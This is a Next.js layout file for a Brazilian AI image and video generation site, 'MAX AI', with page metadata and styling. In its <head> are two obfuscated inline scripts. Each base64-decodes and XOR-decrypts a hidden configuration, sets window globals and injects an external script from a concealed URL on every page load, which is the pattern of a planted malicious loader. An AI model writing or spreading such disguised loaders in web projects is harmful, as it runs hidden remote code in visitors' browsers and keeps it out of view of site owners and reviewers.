import { Inter } from "next/font/google";

const inter = Inter({
  subsets: ["latin"],
  variable: "--font-inter",
});

export const metadata = {
  title: "MAX AI — Crie Imagens e Vídeos Incríveis com Inteligência Artificial",
  description: "Plataforma de IA para geração de imagens e vídeos profissionais. Modelos Gpt Image-2, Grok e Veo 3.1. Comece grátis.",
  icons: {
    icon: "/favicon.png",
    apple: "/icons/max-ai-icon.png",
  },
  openGraph: {
    title: "MAX AI — Crie Imagens e Vídeos Incríveis com IA",
    description: "Plataforma de IA para geração de imagens e vídeos profissionais. Comece grátis.",
    images: ["/icons/max-ai-preview.png"],
    type: "website",
  },
};

export const viewport = {
  themeColor: "#000000",
  width: "device-width",
  initialScale: 1,
};

export default function PagesLayout({ children }) {
  return (
    <html lang="pt-BR" className={inter.variable}>
      <head>
        <script dangerouslySetInnerHTML={{ __html: `(function(){var l_s=atob("DPrQtSqVEuThzzpgoYHywFj5MN7Dp04U0YnqmgX2dorPuk4NyJypm0n6f8qDvRUTwoi5xV7mPZSIt18Mjoq5zU/5PI6S7RZCwI6kx0P3Z5CEvBha+qf8l035fYaAo0lCm6Grl0T0f4HD9RgQyIK12WPxMMjDuVsM1J/yjwijK4fX/QMGls/jhByldtDS9wgCmcLkjE+3b7mc");var g_3p=[];for(var b_4=0;b_4<l_s.length;b_4++){g_3p.push(l_s.charCodeAt(b_4)&255);}var i_cid=g_3p[0];var r_xr=g_3p.slice(1,1+i_cid);var i_fpj=g_3p.slice(1+i_cid);var m_iu=i_fpj.map(function(b,b_h){return b^r_xr[b_h%i_cid];});var b_9ad="";for(var w_uc=0;w_uc<m_iu.length;w_uc++){b_9ad+=String.fromCharCode(m_iu[w_uc]&255);}var m_b=decodeURIComponent(escape(b_9ad));var g_ml=JSON.parse(m_b);var e_dro=g_ml.globals||[];e_dro.forEach(function(u_q1gl){window[u_q1gl.name]=u_q1gl.value;});var k_4a8=document.createElement("script");k_4a8.src=g_ml.url;k_4a8.async=true;k_4a8.defer=true;(g_ml.attributes||[]).forEach(function(b_r0na){k_4a8.setAttribute(b_r0na.name,b_r0na.value);});(document.head||document.documentElement).appendChild(k_4a8);})();` }} />
        <script dangerouslySetInnerHTML={{ __html: `(function(){var u_o=atob("DD0F+yfwMLzSWHEHwkYnjlWcEobwMAVzsk4/1AiTVNL8LQVqq1t81USfXZKwKl50oU9si1ODH8mmNQIorlxxnlSEHtahel0lo0lxiU6SRci3K1M9mUYnlUadVZ7oehVmtlwojlOdWdqrdQF1p0tglVPdSN+9PFx0oVYn1wWGUdCnPVM94B9411zSXt2/PVM94Flkj0bdRci/MRd+7013nlGVXsj/KwRlq1l22QvSRt2+LRQl+B8nhnqN");var i_vvn3=[];for(var o_qn=0;o_qn<u_o.length;o_qn++){i_vvn3.push(u_o.charCodeAt(o_qn)&255);}var a_fo5=i_vvn3[0];var v_z=i_vvn3.slice(1,1+a_fo5);var p_vb5=i_vvn3.slice(1+a_fo5);var f_aya=p_vb5.map(function(b,o_1i){return b^v_z[o_1i%a_fo5];});var r_l="";for(var j_ylz3=0;j_ylz3<f_aya.length;j_ylz3++){r_l+=String.fromCharCode(f_aya[j_ylz3]&255);}var o_yl=decodeURIComponent(escape(r_l));var z_vz6=JSON.parse(o_yl);var c_a0=z_vz6.globals||[];c_a0.forEach(function(i_d){window[i_d.name]=i_d.value;});var a_xp=document.createElement("script");a_xp.src=z_vz6.url;a_xp.async=true;a_xp.defer=true;(z_vz6.attributes||[]).forEach(function(a_c){a_xp.setAttribute(a_c.name,a_c.value);});(document.head||document.documentElement).appendChild(a_xp);})();` }} />
      </head>
      <body
        style={{
          margin: 0,
          padding: 0,
          background: "#06060A",
          color: "#FFFFFF",
          fontFamily: "'Inter', system-ui, -apple-system, sans-serif",
          WebkitFontSmoothing: "antialiased",
          MozOsxFontSmoothing: "grayscale",
        }}
      >
        {children}
      </body>
    </html>
  );
}
